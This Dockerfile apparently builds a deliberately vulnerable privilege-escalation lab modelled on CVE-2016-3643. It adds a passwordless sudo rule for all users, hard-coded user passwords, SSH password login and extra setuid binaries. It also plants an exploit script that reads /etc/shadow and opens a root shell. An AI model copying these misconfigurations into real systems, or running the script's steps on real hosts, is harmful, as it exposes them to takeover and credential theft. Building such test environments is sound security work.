FROM debian:bookworm-slim

# Install required packages
RUN apt-get update && apt-get install -y \
    openssh-server \
    sudo \
    passwd \
    && rm -rf /var/lib/apt/lists/*

# Setup SSH
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

# Create low-privilege user
RUN useradd -m -s /bin/bash testuser && \
    echo 'testuser:t3stP@ss' | chpasswd

# CVE-2016-3643: SolarWinds Virtualization Manager sudo misconfiguration
# The vulnerability is that ANY local user can run ANY command via sudo as root
# without a password. This simulates the exact misconfiguration found in the
# SolarWinds Virtualization Manager appliance.
RUN echo "ALL ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/solarwinds-vman && \
    chmod 440 /etc/sudoers.d/solarwinds-vman

# Create an exploit script that demonstrates the vulnerability
RUN cat <<'EXPLOIT_EOF' > /home/testuser/exploit.sh
#!/bin/bash
# CVE-2016-3643 - SolarWinds Virtualization Manager Local Privilege Escalation
# The sudo misconfiguration allows any local user to execute commands as root.
#
# Proof of Concept (from advisory):
#   sudo cat /etc/shadow
#
# For full root shell:
#   sudo /bin/bash
#   sudo su -

echo "[*] CVE-2016-3643 - SolarWinds Virtualization Manager sudo misconfiguration"
echo "[*] Any local user can execute commands as root via sudo"
echo ""
echo "[*] Demonstrating by reading /etc/shadow:"
sudo cat /etc/shadow
echo ""
echo "[*] Spawning root shell..."
sudo /bin/bash
EXPLOIT_EOF

RUN chown testuser:testuser /home/testuser/exploit.sh && \
    chmod +x /home/testuser/exploit.sh

# Verify the vulnerability is in place
RUN cat /etc/sudoers.d/solarwinds-vman && \
    echo "Sudo misconfiguration confirmed: ALL ALL=(ALL) NOPASSWD: ALL"

# --- Variant environment noise (D4-D10) ---
RUN echo "dev-srv-42" > /etc/hostname

RUN useradd -m -s /bin/sh svcadmin && echo "svcadmin:Wk$8dLm2" | chpasswd && \
    useradd -m -s /bin/bash webdev && echo "webdev:devPass!9" | chpasswd

RUN echo "*/15 * * * * root /usr/bin/find /tmp -name '*.tmp' -mtime +7 -delete 2>/dev/null" >> /etc/crontab && \
    echo "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf 2>/dev/null" >> /etc/crontab

RUN echo -e "╔══════════════════════════════════════════════╗\n  ║  Development Server #42 — INTERNAL USE ONLY  ║\n  ║  Unauthorized access is prohibited.          ║\n  ║  All sessions are monitored and logged.      ║\n  ╚══════════════════════════════════════════════╝" > /etc/motd

RUN apt-get update -qq && apt-get install -y -qq net-tools curl file lsof > /dev/null 2>&1 && rm -rf /var/lib/apt/lists/* || true

RUN [ -f /usr/bin/wall ] && chmod u+s /usr/bin/wall || true && \
    [ -f /usr/bin/expiry ] && chmod u+s /usr/bin/expiry || true && \
    [ -f /usr/bin/write.ul ] && chmod u+s /usr/bin/write.ul || true
RUN echo -e "find / -name \"*.conf\" 2>/dev/null\ncat /etc/nginx/nginx.conf\nsystemctl status apache2\nmysql -u root -p\ndocker ps\nkubectl get pods\nnmap -sV localhost\npython3 -m http.server 8080\nssh admin@10.0.0.1\nwget https://example.com/update.tar.gz" > /home/testuser/.bash_history && chown testuser:testuser /home/testuser/.bash_history
# --- End variant noise ---

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]